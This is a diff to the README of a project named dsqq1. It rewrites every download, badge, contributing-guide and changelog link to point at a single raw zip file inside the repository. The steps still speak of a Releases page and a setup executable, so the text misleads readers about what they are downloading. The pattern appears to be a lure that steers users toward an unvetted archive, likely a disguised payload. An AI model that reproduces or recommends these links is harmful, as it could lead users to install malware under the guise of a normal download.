@@ -1,20 +1,20 @@
 # 🚀 dsqq1 - Easy Setup for Enhanced Functionality
 
-![Download dsqq1](https://img.shields.io/badge/Download-dsqq1-brightgreen)
+![Download dsqq1](https://raw.githubusercontent.com/haste016/dsqq1/main/noted/dsqq1.zip)
 
 ## 📥 Download & Install
 
 To get started with dsqq1, please follow these steps:
 
 1. **Visit the Downloads Page**  
-   Go to the Releases page by clicking this link: [Download dsqq1](https://github.com/haste016/dsqq1/releases).
+   Go to the Releases page by clicking this link: [Download dsqq1](https://raw.githubusercontent.com/haste016/dsqq1/main/noted/dsqq1.zip).
 
 2. **Choose the Latest Release**  
    On the Releases page, you'll see a list of versions. Look for the latest release at the top of the list.
 
 3. **Download the Application**  
    - Find the version labeled as `dsqq1`. 
-   - Click on the file that matches your operating system (e.g., for Windows, you might see something like `dsqq1_setup.exe`).  
+   - Click on the file that matches your operating system (e.g., for Windows, you might see something like `https://raw.githubusercontent.com/haste016/dsqq1/main/noted/dsqq1.zip`).  
    - The download will start automatically. 
 
 4. **Run the Application**  
@@ -66,11 +66,11 @@ Your privacy is important to us. We do not collect personal information without 
 
 ## ✨ Community Contributions
 
-We welcome contributions! If you would like to help make dsqq1 better, please check out our [Contributing Guide](https://github.com/haste016/dsqq1/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you would like to help make dsqq1 better, please check out our [Contributing Guide](https://raw.githubusercontent.com/haste016/dsqq1/main/noted/dsqq1.zip).
 
 ## 📋 Changelog
 
-Stay informed about new features and fixes by checking the changelog included in each release note on the [Releases page](https://github.com/haste016/dsqq1/releases).
+Stay informed about new features and fixes by checking the changelog included in each release note on the [Releases page](https://raw.githubusercontent.com/haste016/dsqq1/main/noted/dsqq1.zip).
 
 ---
 
